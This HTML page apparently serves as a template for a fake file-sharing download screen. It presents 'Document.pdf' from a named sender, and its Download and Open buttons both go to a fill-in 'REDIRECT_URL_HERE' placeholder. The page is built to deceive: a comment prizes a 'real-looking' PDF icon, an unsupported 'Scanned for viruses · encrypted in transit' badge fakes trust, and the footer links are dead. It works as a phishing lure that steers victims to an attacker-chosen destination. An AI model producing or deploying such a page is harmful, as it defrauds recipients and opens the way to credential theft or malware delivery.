<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document.pdf — Download</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        :root {
            --bg: #f4f5f7;
            --surface: #ffffff;
            --border: #e4e6ea;
            --border-strong: #d4d7dc;
            --text: #1f2328;
            --muted: #5b6470;
            --subtle: #8a929d;
            --accent: #2563eb;
            --accent-hover: #1d4ed8;
            --accent-soft: #eff4ff;
        }

        html, body { height: 100%; }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: var(--bg);
            color: var(--text);
            font-size: 14px;
            line-height: 1.5;
            -webkit-font-smoothing: antialiased;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .topstrip {
            padding: 18px 24px;
            font-size: 13px;
            color: var(--subtle);
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .topstrip svg { width: 14px; height: 14px; }

        .wrap {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding: 8px 24px 48px;
        }

        .card {
            width: 100%;
            max-width: 480px;
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 1px 2px rgba(0,0,0,0.03);
        }

        /* ----- header block ----- */
        .head {
            padding: 28px 28px 20px;
            display: flex;
            gap: 18px;
            align-items: center;
        }

        .pdf-icon {
            width: 52px;
            height: 64px;
            flex-shrink: 0;
            display: block;
        }

        .head-meta { min-width: 0; flex: 1; }
        .filename {
            font-size: 17px;
            font-weight: 600;
            color: var(--text);
            word-break: break-word;
            line-height: 1.35;
        }
        .filesize {
            margin-top: 3px;
            font-size: 13px;
            color: var(--muted);
        }
        .filesize .sep {
            display: inline-block;
            margin: 0 6px;
            color: var(--subtle);
        }

        /* ----- action ----- */
        .actions {
            padding: 4px 28px 22px;
            display: flex;
            gap: 10px;
        }

        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            padding: 10px 18px;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 600;
            font-family: inherit;
            cursor: pointer;
            border: 1px solid transparent;
            transition: background 0.15s, border-color 0.15s;
        }
        .btn svg { width: 16px; height: 16px; }

        .btn-primary {
            background: var(--accent);
            color: #fff;
            flex: 1;
        }
        .btn-primary:hover { background: var(--accent-hover); }

        .btn-secondary {
            background: var(--surface);
            color: var(--text);
            border-color: var(--border-strong);
        }
        .btn-secondary:hover { background: var(--bg); }

        /* ----- details list ----- */
        .details {
            padding: 16px 28px 8px;
            border-top: 1px solid var(--border);
        }
        .row {
            display: flex;
            padding: 9px 0;
            font-size: 13.5px;
            gap: 16px;
        }
        .row dt {
            width: 110px;
            color: var(--muted);
            flex-shrink: 0;
        }
        .row dd {
            color: var(--text);
            font-weight: 500;
            word-break: break-word;
            min-width: 0;
        }
        .row dd .from {
            display: block;
            font-size: 12px;
            color: var(--muted);
            font-weight: 400;
            margin-top: 1px;
        }

        /* ----- footer note ----- */
        .note {
            padding: 12px 28px;
            background: var(--accent-soft);
            border-top: 1px solid var(--border);
            display: flex;
            gap: 10px;
            align-items: center;
            font-size: 12.5px;
            color: var(--muted);
        }
        .note svg {
            width: 15px; height: 15px;
            color: var(--accent);
            flex-shrink: 0;
        }

        .pagefoot {
            text-align: center;
            color: var(--subtle);
            font-size: 12px;
            padding: 16px 24px 24px;
        }
        .pagefoot a { color: var(--muted); text-decoration: none; margin: 0 6px; }
        .pagefoot a:hover { color: var(--text); text-decoration: underline; }

        @media (max-width: 480px) {
            .head { padding: 22px 20px 16px; gap: 14px; }
            .actions { padding: 0 20px 18px; }
            .details { padding: 14px 20px 6px; }
            .note { padding: 12px 20px; }
            .filename { font-size: 16px; }
            .row { gap: 12px; }
            .row dt { width: 90px; }
        }
    </style>
</head>
<body>

    <div class="topstrip">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
        </svg>
        <span>Secure document delivery</span>
    </div>

    <main class="wrap">
        <article class="card" aria-labelledby="filename">

            <header class="head">
                <!-- Real-looking PDF document icon -->
                <svg class="pdf-icon" viewBox="0 0 52 64" aria-hidden="true">
                    <defs>
                        <linearGradient id="pageGrad" x1="0" y1="0" x2="0" y2="1">
                            <stop offset="0%" stop-color="#ffffff"/>
                            <stop offset="100%" stop-color="#f3f4f6"/>
                        </linearGradient>
                        <linearGradient id="foldGrad" x1="0" y1="0" x2="1" y2="1">
                            <stop offset="0%" stop-color="#e5e7eb"/>
                            <stop offset="100%" stop-color="#cbd0d7"/>
                        </linearGradient>
                    </defs>
                    <!-- page body -->
                    <path d="M4 2 H34 L48 16 V60 a2 2 0 0 1 -2 2 H4 a2 2 0 0 1 -2 -2 V4 a2 2 0 0 1 2 -2 z"
                          fill="url(#pageGrad)" stroke="#c9ced6" stroke-width="1"/>
                    <!-- folded corner -->
                    <path d="M34 2 L48 16 H36 a2 2 0 0 1 -2 -2 z"
                          fill="url(#foldGrad)" stroke="#c9ced6" stroke-width="1" stroke-linejoin="round"/>
                    <!-- red PDF badge -->
                    <rect x="6" y="34" width="32" height="16" rx="2" fill="#d93025"/>
                    <text x="22" y="45.5" text-anchor="middle"
                          font-family="Inter, Arial, sans-serif"
                          font-size="9" font-weight="700" fill="#ffffff"
                          letter-spacing="0.5">PDF</text>
                    <!-- subtle text lines on page -->
                    <rect x="8" y="20" width="22" height="2" rx="1" fill="#d4d7dc"/>
                    <rect x="8" y="25" width="28" height="2" rx="1" fill="#d4d7dc"/>
                    <rect x="8" y="55" width="20" height="2" rx="1" fill="#d4d7dc"/>
                </svg>

                <div class="head-meta">
                    <h1 id="filename" class="filename">Document.pdf</h1>
                    <div class="filesize">
                        <span>2.4 MB</span>
                        <span class="sep">·</span>
                        <span>6 pages</span>
                    </div>
                </div>
            </header>

            <div class="actions">
                <button type="button" class="btn btn-primary"
                        onclick="window.location.href='REDIRECT_URL_HERE'">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
                        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
                        <polyline points="7 10 12 15 17 10"/>
                        <line x1="12" y1="15" x2="12" y2="3"/>
                    </svg>
                    Download
                </button>
                <button type="button" class="btn btn-secondary"
                        onclick="window.open('REDIRECT_URL_HERE','_blank','noopener')">
                    Open
                </button>
            </div>

            <dl class="details">
                <div class="row">
                    <dt>From</dt>
                    <dd>
                        Sarah Reynolds
                        <span class="from">sarah.reynolds@example.com</span>
                    </dd>
                </div>
                <div class="row">
                    <dt>Sent</dt>
                    <dd>May 3, 2026 · 8:14 AM</dd>
                </div>
                <div class="row">
                    <dt>Type</dt>
                    <dd>PDF document · 2,458,112 bytes</dd>
                </div>
                <div class="row">
                    <dt>Expires</dt>
                    <dd>May 10, 2026 (in 7 days)</dd>
                </div>
            </dl>

            <div class="note">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                </svg>
                <span>Scanned for viruses · encrypted in transit</span>
            </div>

        </article>
    </main>

    <footer class="pagefoot">
        <a href="#">Help</a>·<a href="#">Privacy</a>·<a href="#">Terms</a>
    </footer>

</body>
</html>
